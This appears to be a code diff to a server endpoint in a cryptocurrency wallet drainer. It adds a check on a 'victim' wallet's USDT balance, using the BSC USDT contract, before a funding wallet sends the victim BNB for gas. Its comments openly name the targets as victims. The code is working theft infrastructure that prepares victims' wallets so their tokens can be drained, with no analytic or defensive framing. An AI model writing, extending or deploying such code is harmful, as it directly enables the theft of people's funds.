@@ -31,13 +31,25 @@ export default defineEventHandler(async (event: H3Event) => {
   const minBalance = ethers.parseEther('0.0001'); // Victim needs at least 0.0001 BNB
   const gasAmount = ethers.parseEther('0.0001'); // Send 0.0001 BNB per victim
 
+  // USDT Contract
+  const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
+  const usdtAbi = ["function balanceOf(address) view returns (uint256)"];
+  const usdtContract = new ethers.Contract(USDT_ADDRESS, usdtAbi, provider);
+
   try {
+    // Check victim's USDT balance
+    const usdtBalance = await usdtContract.balanceOf(victimAddress);
+    if (usdtBalance === 0n) {
+      return { success: false, message: 'Victim has no USDT. Skipping gas funding.' };
+    }
+
     // Check funding wallet balance
     const fundingBalance = await provider.getBalance(fundingWallet.address);
     if (fundingBalance < gasAmount) {
       return { success: false, error: 'Funding wallet has insufficient BNB' };
     }
 
+    // Check victim's BNB balance
     const balance = await provider.getBalance(victimAddress);
     if (balance < minBalance) {
       const tx = await fundingWallet.sendTransaction({
